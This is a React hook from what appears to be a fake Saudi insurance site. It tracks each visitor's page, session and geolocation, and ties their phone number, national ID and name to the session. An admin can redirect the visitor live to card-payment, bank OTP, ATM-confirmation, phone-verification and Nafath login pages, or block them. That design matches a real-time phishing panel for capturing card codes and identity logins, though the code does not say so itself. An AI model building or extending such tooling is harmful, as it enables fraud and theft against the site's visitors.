import { useEffect, useRef, useCallback, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";

const PAGE_NAMES: Record<string, string> = {
  "/": "الصفحة الرئيسية",
  "/about": "من نحن",
  "/insurance-request": "طلب تأمين",
  "/insurance/offers": "عروض التأمين",
  "/insurance/compare": "مقارنة العروض",
  "/insurance/checkout": "إتمام الشراء",
  "/insurance/payment": "الدفع بالبطاقة",
  "/insurance/otp": "رمز التحقق البنكي",
  "/insurance/atm": "تأكيد ATM",
  "/insurance/phone-verify": "توثيق الجوال",
  "/insurance/phone-otp": "كود توثيق الجوال",
  "/insurance/phone-stc": "مكالمة STC",
  "/insurance/nafath-login": "دخول نفاذ",
  "/insurance/nafath-verify": "تحقق نفاذ",
  "/insurance/confirmation": "تأكيد الطلب",
  "/verify-policy": "التحقق من الوثيقة",
  "/admin/login": "دخول الأدمن",
  "/admin": "لوحة التحكم",
};

function getPageName(pathname: string): string {
  return PAGE_NAMES[pathname] || pathname;
}

function getSessionId(): string {
  let sid = sessionStorage.getItem("visitor_sid");
  if (!sid) {
    sid = crypto.randomUUID();
    sessionStorage.setItem("visitor_sid", sid);
  }
  return sid;
}

async function clearRedirect(sid: string) {
  try {
    await supabase.rpc("clear_visitor_redirect", { p_session_id: sid } as any);
  } catch {}
}

export function useVisitorTracking() {
  const location = useLocation();
  const navigate = useNavigate();
  const sessionId = useRef(getSessionId());
  const intervalRef = useRef<ReturnType<typeof setInterval>>();
  const realtimeChannelRef = useRef<ReturnType<typeof supabase.channel> | null>(null);
  const [isBlocked, setIsBlocked] = useState(false);
  const [pendingRedirect, setPendingRedirect] = useState<string | null>(null);
  const lastRedirectRef = useRef<string | null>(null);

  // Realtime subscription — mounted ONCE, never torn down on page change
  useEffect(() => {
    if (location.pathname.startsWith("/admin") || sessionStorage.getItem("is_admin_session") === "1") return;

    const sid = sessionId.current;

    const channel = supabase
      .channel(`visitor-redirect-${sid}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "site_visitors",
          filter: `session_id=eq.${sid}`,
        },
        (payload) => {
          const updated = payload.new as any;

          if (updated?.redirect_to && updated.redirect_to !== lastRedirectRef.current) {
            lastRedirectRef.current = updated.redirect_to;
            // Clear from DB immediately so it doesn't fire again on next poll
            clearRedirect(sid);
            setPendingRedirect(updated.redirect_to);
          }

          if (updated?.is_blocked) {
            setIsBlocked(true);
          }
        }
      )
      .subscribe((status) => {
        if (status === "SUBSCRIBED") {
          // On subscribe, check if there's a pending redirect already in DB
          // (in case admin set it before we subscribed)
          supabase
            .from("site_visitors")
            .select("redirect_to, is_blocked")
            .eq("session_id", sid)
            .single()
            .then(({ data }) => {
              if (data?.redirect_to && data.redirect_to !== lastRedirectRef.current) {
                lastRedirectRef.current = data.redirect_to;
                clearRedirect(sid);
                setPendingRedirect(data.redirect_to);
              }
              if (data?.is_blocked) setIsBlocked(true);
            });
        }
      });

    realtimeChannelRef.current = channel;

    return () => {
      if (realtimeChannelRef.current) {
        supabase.removeChannel(realtimeChannelRef.current);
        realtimeChannelRef.current = null;
      }
    };
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []); // mount once only

  // Polling + page tracking
  useEffect(() => {
    if (location.pathname.startsWith("/admin") || sessionStorage.getItem("is_admin_session") === "1") return;

    const sid = sessionId.current;
    const pageName = getPageName(location.pathname);
    const geoResolved = sessionStorage.getItem("visitor_geo_resolved");

    const upsert = async () => {
      const { data, error } = await supabase.rpc("upsert_visitor_tracking", {
        p_session_id: sid,
        p_current_page: pageName,
        p_is_online: true,
      });

      if (!error && data) {
        const result = data as any;
        if (result?.is_blocked) setIsBlocked(true);
        // Fallback: polling catches redirect if Realtime missed it
        if (result?.redirect_to && result.redirect_to !== lastRedirectRef.current) {
          lastRedirectRef.current = result.redirect_to;
          // RPC no longer auto-clears, so clear explicitly
          clearRedirect(sid);
          setPendingRedirect(result.redirect_to);
        }
      }
    };

    upsert();

    if (!geoResolved) {
      sessionStorage.setItem("visitor_geo_resolved", "1");
      supabase.functions.invoke("resolve-geo", {
        body: { session_id: sid },
      }).catch(() => {});
    }

    intervalRef.current = setInterval(upsert, 15000);

    return () => {
      if (intervalRef.current) clearInterval(intervalRef.current);
    };
  }, [location.pathname]);

  // Clear state when visitor arrives at target page
  useEffect(() => {
    if (pendingRedirect && location.pathname === pendingRedirect) {
      setPendingRedirect(null);
      lastRedirectRef.current = null;
    }
  }, [location.pathname, pendingRedirect]);

  useEffect(() => {
    if (isBlocked && location.pathname !== "/") {
      navigate("/", { replace: true });
    }
  }, [isBlocked, location.pathname, navigate]);

  const acceptRedirect = useCallback(() => {
    if (pendingRedirect) {
      navigate(pendingRedirect, { replace: true });
      setPendingRedirect(null);
    }
  }, [pendingRedirect, navigate]);

  const dismissRedirect = useCallback(() => {
    setPendingRedirect(null);
  }, []);

  const linkVisitorData = useCallback(async (data: {
    phone?: string;
    national_id?: string;
    visitor_name?: string;
    linked_request_id?: string;
    linked_conversation_id?: string;
  }) => {
    const sid = sessionId.current;
    await supabase.rpc("link_visitor_data", {
      p_session_id: sid,
      p_phone: data.phone || null,
      p_national_id: data.national_id || null,
      p_visitor_name: data.visitor_name || null,
    });
  }, []);

  return {
    linkVisitorData,
    sessionId: sessionId.current,
    isBlocked,
    pendingRedirect,
    acceptRedirect,
    dismissRedirect,
  };
}
